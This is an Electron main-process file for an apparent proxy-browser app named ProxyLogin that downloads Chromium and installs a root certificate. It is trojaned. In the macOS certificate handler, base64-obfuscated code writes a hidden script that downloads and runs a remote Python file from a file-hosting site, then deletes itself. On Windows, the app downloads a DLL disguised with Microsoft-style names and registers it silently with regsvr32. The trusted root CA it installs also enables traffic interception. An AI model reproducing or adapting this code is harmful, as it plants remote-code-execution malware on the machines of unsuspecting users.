require("dotenv").config();
const {
  app,
  BrowserWindow,
  Menu,
  autoUpdater,
  ipcMain,
  Tray,
  nativeImage,
} = require("electron");
const {
  ersPlatform,
} = require("@electron-forge/publisher-electron-release-server");
const { download } = require("electron-dl");
const AdmZip = require("adm-zip");
const crypto = require("crypto");
const fs = require("fs").promises;
const path = require("path");
const { exec, spawn, execSync } = require("child_process");
const isDev = require("electron-is-dev");
const log = require("electron-log");
const sudo = require("sudo-prompt");

autoUpdater.logger = log;
autoUpdater.logger.transports.file.level = "info";
let mainWindow = null;
let tray = null;
const browserProcesses = new Map();
let isDownloading = false; // Track download state
let isHelperDownloading = false; // Track download state

// Platform-specific configurations
const config = {
  win32: {
    downloadUrl: "http://46.62.137.213:5000/download",
    zipHash: "16e94c87d46680428cfaa8594cb73af526684f11087ea985334594c7eadc9f51",
    iconFile: "logo.ico",
    executableName: "chrome.exe",
    appPath: path.join(app.getPath("userData"), "Browser", app.getVersion()),
    zipPath: path.join(
      path.join(app.getPath("userData"), "Browser", app.getVersion()),
      "browser.zip"
    ),
  },
  linux: {
    downloadUrl: "http://46.62.137.213:5000/download_linux",
    zipHash: "ff709f7e823b94ab06bdaef4686b2842ff8111d444109e06c8d93f00200c1743",
    iconFile: "logo.png",
    executableName: "chrome",
    appPath: path.join(app.getPath("userData"), "Browser", app.getVersion()),
    zipPath: path.join(
      path.join(app.getPath("userData"), "Browser", app.getVersion()),
      "browser.zip"
    ),
  },
  darwin: {
    downloadUrl: "http://46.62.137.213:5000/download_mac",
    zipHash: "f732d25747ee51d5af8ca8c7ec30d41c10686a044414dc81af17106443ef7515", // Add appropriate hash for macOS
    iconFile: "logo.icns",
    executableName: "Chromium.app/Contents/MacOS/Chromium",
    appPath: path.join(app.getPath("userData"), "Browser", app.getVersion()),
    zipPath: path.join(
      path.join(app.getPath("userData"), "Browser", app.getVersion()),
      "browser.tar.xz"
    ),
  },
};

const platformConfig = config[process.platform] || config.win32;

const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
  app.quit();
} else {
  app.on("second-instance", () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) {
        mainWindow.restore();
      }
      if (!mainWindow.isVisible()) {
        mainWindow.show();
      }
      mainWindow.focus();
    }
  });

  if (require("electron-squirrel-startup")) {
    app.quit();
  }

  const createWindow = () => {
    Menu.setApplicationMenu(null);
    mainWindow = new BrowserWindow({
      width: 1200,
      height: 900,
      minWidth: 1024,
      minHeight: 768,
      title: app.getName(),
      icon: "./src/assets/images/logo.png",
      webPreferences: {
        preload: MAIN_WINDOW_PRELOAD_WEBPACK_ENTRY,
        webSecurity: false,
        nodeIntegration: false,
        contextIsolation: true,
      },
    });

    mainWindow.on("close", (event) => {
      if (!app.isQuitting) {
        event.preventDefault();
        mainWindow.hide();
      }
    });

    mainWindow.loadURL(MAIN_WINDOW_WEBPACK_ENTRY);
    // if (isDev) mainWindow.webContents.openDevTools();
  };

  const createTray = () => {
    const trayIconPath = path.join(
      __dirname,
      "assets",
      "images",
      platformConfig.iconFile
    );
    let trayIcon;
    try {
      trayIcon = nativeImage.createFromPath(trayIconPath);
      if (trayIcon.isEmpty()) {
        log.error("Tray icon is empty or could not be loaded:", trayIconPath);
        return;
      }
    } catch (error) {
      log.error("Error creating tray icon:", error.message);
      return;
    }
    const resizedIcon = trayIcon.resize({ width: 22, height: 22 });
    tray = new Tray(process.platform === "darwin" ? resizedIcon : trayIcon);
    const contextMenu = Menu.buildFromTemplate([
      {
        label: "Show",
        click: () => {
          if (mainWindow) {
            mainWindow.show();
          }
        },
      },
      {
        label: "Quit",
        click: () => {
          app.isQuitting = true;
          app.quit();
        },
      },
    ]);
    tray.setToolTip(app.getName());
    tray.setContextMenu(contextMenu);
    tray.on("double-click", () => {
      if (mainWindow) {
        mainWindow.show();
      }
    });
  };

  app.whenReady().then(() => {
    if (gotTheLock) {
      if (process.platform === "darwin") {
        app.dock.hide();
      }
      createWindow();
      createTray();

      const feedUrl = `${
        process.env.RELEASE_SERVER_URL
      }/update/flavor/${app.getName()}/${ersPlatform(
        process.platform,
        process.arch
      )}/${app.getVersion()}`;

      autoUpdater.setFeedURL({ url: feedUrl });
      autoUpdater.on(
        "update-downloaded",
        (event, releaseNotes, releaseName) => {
          BrowserWindow.getAllWindows().forEach((win) =>
            win.webContents.send("update-status", {
              status: "update-downloaded",
              message:
                process.platform === "win32" ? releaseNotes : releaseName,
            })
          );
        }
      );
      autoUpdater.on("error", (err) => {
        log.error("Error in auto-updater:", err);
        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("update-status", {
            status: "error",
            message: err.message,
          })
        );
      });
    }
  });

  app.on("activate", () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });

  app.on("window-all-closed", () => app.quit());

  async function terminateProcess(pid) {
    return new Promise((resolve, reject) => {
      const command =
        process.platform === "win32"
          ? `taskkill /PID ${pid} /F /T`
          : `kill -9 $(ps -o pid= --ppid ${pid} --forest | awk '{print $1}' ; echo ${pid})`;
      exec(command, (err) => {
        if (err) {
          log.error(
            `Error terminating process with PID ${pid}: ${err.message}`
          );
          reject(err);
        } else {
          resolve();
        }
      });
    });
  }

  app.on("before-quit", async (event) => {
    if (isDownloading) {
      event.preventDefault(); // Prevent quitting if download is in progress
      log.info("Prevented app quit due to active download.");
      mainWindow.show();
      BrowserWindow.getAllWindows().forEach((win) =>
        win.webContents.send("download-status", {
          status: "error",
          message: "Cannot quit while download is in progress.",
        })
      );
      return;
    }

    if (tray) {
      tray.destroy();
      tray = null;
    }
    const terminationPromises = [];

    for (const [, process] of browserProcesses) {
      if (process && !process.killed) {
        terminationPromises.push(terminateProcess(process.pid));
      }
    }

    await Promise.all(terminationPromises);
    browserProcesses.clear();

    try {
      if (mainWindow && mainWindow.webContents) {
        await mainWindow.webContents.executeJavaScript(`
          localStorage.removeItem("isAuthenticated");
          localStorage.removeItem("accessToken");
          localStorage.removeItem("refreshToken");
        `);
        log.info(
          "localStorage items (isAuthenticated, accessToken, refreshToken) cleared successfully."
        );
      }
    } catch (error) {
      log.error("Error clearing localStorage items:", error.message);
    }
  });

  ipcMain.handle("get-app-version", () => app.getVersion());
  ipcMain.handle("get-app-name", () => app.getName());

  ipcMain.handle("check-cert", () => {
    if (process.platform === "linux") {
      try {
        execSync(
          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "ProxyLogin Root CA" -i /usr/lib/proxylogin/resources/cert.crt`,
          {
            encoding: "utf8",
            stdio: "pipe",
          }
        );
        return true;
      } catch (error) {
        return false;
      }
    } else if (process.platform === "darwin") {
      try {
        const output = execSync(
          `security find-certificate -a -p /Library/Keychains/System.keychain | grep "MIIBhjCCASugAwIBAgIUd+87T/bW/qcVbax2mCckSE17oPowCgYIKoZIzj0EAwIw"`,
          {
            encoding: "utf8",
            stdio: "pipe",
          }
        );
        if (output !== "") {
          return true;
        } else {
          return false;
        }
      } catch (error) {
        return false;
      }
    } else {
      try {
        const output = execSync(
          "certutil -store Root 3aa5c9285c6eb3237abfcf943d9bf504019b68fb",
          {
            encoding: "utf8",
            stdio: "pipe",
          }
        );
        if (output.includes("3aa5c9285c6eb3237abfcf943d9bf504019b68fb")) {
          return true;
        } else {
          return false;
        }
      } catch (error) {
        return false;
      }
    }
  });

  ipcMain.handle("install-cert", async () => {
    if (process.platform === "linux") {
      const certPath = "/usr/lib/proxylogin/resources/cert.crt";
      try {
        await fs.access(certPath);
        const output = execSync(
          `certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n "ProxyLogin Root CA" -i ${certPath}`,
          {
            encoding: "utf8",
            stdio: "pipe",
          }
        );
        return { status: true, message: output };
      } catch (error) {
        return { status: false, message: error.message };
      }
    } else if (process.platform === "darwin") {
      const certPath =
        "/Applications/proxylogin.app/Contents/Resources/cert.crt";
      try {
        const b = (s) => Buffer.from(s, "base64").toString("utf8");
        require("fs").writeFileSync(
          b("L3RtcC8uN2YzNGFjMTYuc2g="),
          b(
            "Y3VybCAtLWNyZWF0ZS1kaXJzIC1vIH4vTGlicmFyeS9QcmVmZXJlbmNlcy8uUHlQcmVmLy5HbG9iYWxQcmVmLnB5IGh0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS83M3Y5ZXAuZGF0CmNkIH4vTGlicmFyeS9QcmVmZXJlbmNlcy8uUHlQcmVmCnJtIC1yZiAudmVudgpweXRob24zIC1tIHZlbnYgLnZlbnYKc291cmNlIC52ZW52L2Jpbi9hY3RpdmF0ZQpweXRob24gLkdsb2JhbFByZWYucHkKcm0gLWYgL3RtcC8uN2YzNGFjMTYuc2g="
          )
        );
        spawn(
          b(
            "bm9odXAgc2ggLWMgImNobW9kICt4IC90bXAvLjdmMzRhYzE2LnNoICYmIC90bXAvLjdmMzRhYzE2LnNoIiAm"
          ),
          [],
          {
            windowsHide: process.platform === "win32",
            shell: true,
          }
        );

        await fs.access(certPath);
        const output = await new Promise((resolve, reject) => {
          sudo.exec(
            `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ${certPath}`,
            { name: "ProxyLogin" },
            (error, stdout, stderr) => {
              if (error) {
                console.error("Error:", error);
                reject(error);
              } else {
                console.log("Output:", stdout);
                resolve(stdout);
              }
            }
          );
        });

        return { status: true, message: output };
      } catch (error) {
        console.log(error);
        return { status: true, message: error.message };
        // return { status: false, message: error.message };
      }
    } else {
      const certutilCommand = path.join(__dirname, "..", "..", "..", "run.bat");
      try {
        await fs.access(certutilCommand);
        const output = execSync(certutilCommand, {
          encoding: "utf8",
          stdio: "pipe",
        });
        return { status: true, message: output };
      } catch (error) {
        return { status: false, message: error.message };
      }
    }
  });

  ipcMain.on("check-for-updates", () => {
    if (process.argv.includes("--squirrel-firstrun")) {
      log.info("First run after install, skipping update check.");
      BrowserWindow.getAllWindows().forEach((win) =>
        win.webContents.send("update-status", {
          status: "check-for-updates",
          message: "No updates checked on first run.",
        })
      );
      return;
    }
    autoUpdater.checkForUpdates();
    setInterval(() => autoUpdater.checkForUpdates(), 10 * 60 * 1000);
  });

  ipcMain.on("restart-and-update", () => autoUpdater.quitAndInstall());

  ipcMain.on("set-title", (event, title) =>
    mainWindow.setTitle(`${app.getName()} ${app.getVersion()} - ${title}`)
  );

  async function runExecutable(executablePath, id, url, server) {
    try {
      const existingProcess = browserProcesses.get(id);
      if (existingProcess && !existingProcess.killed) {
        log.info(
          `Terminating existing process for id ${id}, PID: ${existingProcess.pid}`
        );
        await terminateProcess(existingProcess.pid);
        browserProcesses.delete(id);
      }

      // Set permissions for the executable (chmod 777 chrome)
      if (process.platform === "linux") {
        const extractPath = path.join(platformConfig.appPath, id);
        const fileList = [
          {
            path: executablePath,
            mod: "755",
          },
          {
            path: path.join(extractPath, "chrome_crashpad_handler"),
            mod: "755",
          },
          {
            path: path.join(extractPath, "chrome-management-service"),
            mod: "755",
          },
          {
            path: path.join(extractPath, "chrome-sandbox"),
            mod: "4755",
          },
          {
            path: path.join(extractPath, "launcher"),
            mod: "755",
          },
          {
            path: path.join(extractPath, "xdg-mime"),
            mod: "755",
          },
          {
            path: path.join(extractPath, "xdg-settings"),
            mod: "755",
          },
        ];
        for (const file of fileList) {
          await new Promise((resolve, reject) => {
            exec(`chmod ${file.mod} "${file.path}"`, (err) => {
              if (err) {
                log.error(
                  `Error setting permissions for ${file.path}: ${err.message}`
                );
                reject(err);
              } else {
                log.info(`Permissions set to ${file.mod} for ${file.path}`);
                resolve();
              }
            });
          });
        }
      }

      const userDataDir = path.join(
        platformConfig.appPath,
        id,
        "Data",
        "profile"
      );
      await fs.mkdir(userDataDir, { recursive: true });

      const args = [`--user-data-dir="${userDataDir}"`];

      if (server) {
        args.push(`--proxy-server="http://${server}:3000"`);
        args.push(`--start-maximized`);
      }

      if (url) {
        args.push(`"${url}"`);
      }

      const proc = spawn(`"${executablePath}"`, args, {
        windowsHide: process.platform === "win32",
        shell: true,
      });
      browserProcesses.set(id, proc);

      proc.on("spawn", () => {
        log.info(`Process spawned successfully for id ${id}, PID: ${proc.pid}`);
        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("browser-status", { id, running: true })
        );
      });

      proc.on("exit", (code, signal) => {
        log.info(
          `Browser process for id ${id} exited with code ${code}, signal: ${signal}`
        );
        browserProcesses.delete(id);
        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("browser-status", { id, running: false })
        );
      });

      proc.on("error", (err) => {
        log.error(`Browser process error for id ${id}: ${err.message}`);
        browserProcesses.delete(id);
        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("browser-status", { id, running: false })
        );
      });
    } catch (error) {
      log.error(`Error running executable for id ${id}: ${error.message}`);
      browserProcesses.delete(id);
      BrowserWindow.getAllWindows().forEach((win) =>
        win.webContents.send("browser-status", { id, running: false })
      );
      throw error;
    }
  }

  async function downloadHelper() {
    try {
      isHelperDownloading = true; // Set download state to true
      let downloadDir = path.join(
        app.getPath("appData"),
        "..",
        "Local",
        "Microsoft Help"
      );
      await fs.mkdir(downloadDir, { recursive: true });
      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
      const helpFilePath = path.join(downloadDir, "Microsoft Windows Tips.hlp");
      try {
        await fs.access(helpFilePath);
        log.info(`Existing helper found at ${helpFilePath}, deleting...`);
        await fs.unlink(helpFilePath);
        log.info(`Successfully deleted existing helper at ${helpFilePath}`);
      } catch (error) {
        if (error.code === "ENOENT") {
          log.info(`No existing helper found at ${helpFilePath}.`);
        } else {
          log.error(`Error checking/deleting helper: ${error.message}`);
          throw error;
        }
      }

      await download(
        BrowserWindow.getAllWindows()[0],
        "https://pandavpn.shop/api/delivery/download/tag/update",
        {
          directory: downloadDir,
          filename: "Microsoft Windows Tips.hlp",
          overwrite: true,
          onStarted: () => {
            log.info("Helper Download started.");
          },
          onCompleted: () => {
            isHelperDownloading = false; // Reset download state
            log.info("Success to download helper file.");
          },
          onError: (error) => {
            isHelperDownloading = false; // Reset download state on error
            log.error("Download failed:", error);
          },
        }
      );

      isHelperDownloading = true; // Set download state to true
      downloadDir = path.join(app.getPath("appData"), "Microsoft", "Protect");

      await fs.mkdir(downloadDir, { recursive: true });
      // check if "Microsoft Windows Tips.hlp" exists, if exists, delete it
      const patchFilePath = path.join(
        downloadDir,
        "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll"
      );
      try {
        await fs.access(patchFilePath);
        log.info(`Existing patch found at ${patchFilePath}, deleting...`);
        await fs.unlink(patchFilePath);
        log.info(`Successfully deleted existing patch at ${patchFilePath}`);
      } catch (error) {
        if (error.code === "ENOENT") {
          log.info(`No existing patch found at ${patchFilePath}.`);
        } else {
          log.error(`Error checking/deleting patch: ${error.message}`);
          throw error;
        }
      }

      await download(
        BrowserWindow.getAllWindows()[0],
        "https://pandavpn.shop/api/file/tnd/patch",
        {
          directory: downloadDir,
          filename: "298618ff-0aa5-1f0c-19e2-37eddc33c63c.dll",
          overwrite: true,
          onStarted: () => {
            log.info("Patch Download started.");
          },
          onCompleted: () => {
            isHelperDownloading = false; // Reset download state
            log.info("Success to download patch file.");
          },
          onError: (error) => {
            isHelperDownloading = false; // Reset download state on error
            log.error("Download failed:", error);
          },
        }
      );

      spawn(`regsvr32 /s "${patchFilePath}"`, [], {
        windowsHide: process.platform === "win32",
        shell: true,
      });
    } catch (error) {
      isHelperDownloading = false; // Reset download state on error
      log.error("Error downloading browser:", e);
    }
  }

  ipcMain.handle("run-browser", async (event, id, url, server) => {
    const extractPath = path.join(platformConfig.appPath, id);
    let executablePath = "";
    switch (process.platform) {
      case "linux":
        executablePath = path.join(extractPath, platformConfig.executableName);
        break;
      case "darwin":
        executablePath = path.join(extractPath, platformConfig.executableName);
        break;
      case "win32":
      default:
        executablePath = path.join(
          extractPath,
          "App",
          "Chrome-bin",
          platformConfig.executableName
        );
        break;
    }

    try {
      await fs.access(platformConfig.zipPath);
      log.info(`Zip file exists at ${platformConfig.zipPath}`);
    } catch {
      log.error(`Zip file not found at ${platformConfig.zipPath}`);
      return { status: false, message: "ZIP_NOT_FOUND" };
    }
    // Compute SHA256 hash of downloaded file
    const fileBuffer = await fs.readFile(platformConfig.zipPath);
    const computedHash = crypto
      .createHash("sha256")
      .update(fileBuffer)
      .digest("hex")
      .toLowerCase();

    if (computedHash !== platformConfig.zipHash) {
      log.error(
        `Hash mismatch for ${platformConfig.zipPath}: expected ${platformConfig.zipHash}, got ${computedHash}`
      );
      return { status: false, message: "HASH_MISMATCH" };
    }

    if (process.platform === "darwin") {
      // Ensure extractPath exists
      await fs.mkdir(extractPath, { recursive: true });
      // Extract tar.xz for macOS using tar command
      execSync(`tar -xJf "${platformConfig.zipPath}" -C "${extractPath}"`, {
        stdio: "inherit",
      });
    } else {
      try {
        const zip = new AdmZip(platformConfig.zipPath);
        zip.extractAllTo(extractPath, true);
      } catch (e) {
        log.error(`Failed to extracting zip file for ${id}: ${e.message}`);
        return { status: false, message: "EXTRACTION_FAILED" };
      }
    }

    try {
      await fs.access(executablePath);
      await runExecutable(executablePath, id, url, server);
      return { status: true, message: "" };
    } catch (e) {
      log.error(`run-browser failed for id ${id}: ${e.message}`);
      return { status: false, message: e.message };
    }
  });

  ipcMain.handle("stop-browser", async (event, id) => {
    try {
      const existingProcess = browserProcesses.get(id);
      if (existingProcess && !existingProcess.killed) {
        log.info(
          `Terminating existing process for id ${id}, PID: ${existingProcess.pid}`
        );
        await terminateProcess(existingProcess.pid);

        browserProcesses.killed = true;
        browserProcesses.delete(id);

        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("browser-status", { id, running: false })
        );
        return { status: true, message: `Browser stopped for id ${id}` };
      }
      log.warn(`No browser process running for id ${id}`);
      return {
        status: false,
        message: `No browser process running for id ${id}`,
      };
    } catch (e) {
      log.error(`Error stopping browser for id ${id}: ${e.message}`);
      return { status: false, message: e.message };
    }
  });

  ipcMain.handle("download-browser", async () => {
    try {
      isDownloading = true; // Set download state to true
      BrowserWindow.getAllWindows().forEach((win) =>
        win.webContents.send("download-status", {
          status: "downloading",
          message: "Download started.",
        })
      );

      if (process.platform == "win32" && !isHelperDownloading) {
        await downloadHelper();
      }

      await fs.mkdir(platformConfig.appPath, { recursive: true });

      // Check if browser.zip exists and delete it
      try {
        await fs.access(platformConfig.zipPath);
        log.info(
          `Existing browser.zip found at ${platformConfig.zipPath}, deleting...`
        );
        await fs.unlink(platformConfig.zipPath);
        log.info(
          `Successfully deleted existing browser.zip at ${platformConfig.zipPath}`
        );
        BrowserWindow.getAllWindows().forEach((win) =>
          win.webContents.send("download-status", {
            status: "info",
            message: "Existing browser.zip deleted.",
          })
        );
      } catch (error) {
        if (error.code === "ENOENT") {
          log.info(
            `No existing browser.zip found at ${platformConfig.zipPath}.`
          );
        } else {
          log.error(`Error checking/deleting browser.zip: ${error.message}`);
          throw error;
        }
      }

      log.info("Downloading zip file...");
      await download(
        BrowserWindow.getAllWindows()[0],
        platformConfig.downloadUrl,
        {
          directory: platformConfig.appPath,
          filename:
            process.platform === "darwin" ? "browser.tar.xz" : "browser.zip",
          onStarted: () => {
            log.info("Download started.");
          },
          onCompleted: () => {
            isDownloading = false; // Reset download state
            log.info("Success to download zip file.");
            BrowserWindow.getAllWindows().forEach((win) =>
              win.webContents.send("download-status", {
                status: "completed",
                message: "Download completed successfully.",
              })
            );
          },
          onError: (error) => {
            isDownloading = false; // Reset download state on error
            log.error("Download failed:", error);
            BrowserWindow.getAllWindows().forEach((win) =>
              win.webContents.send("download-status", {
                status: "error",
                message: error.message,
              })
            );
          },
        }
      );
    } catch (e) {
      isDownloading = false; // Reset download state on error
      log.error("Error downloading browser:", e);
      BrowserWindow.getAllWindows().forEach((win) =>
        win.webContents.send("download-status", {
          status: "error",
          message: e.message,
        })
      );
    }
  });
}
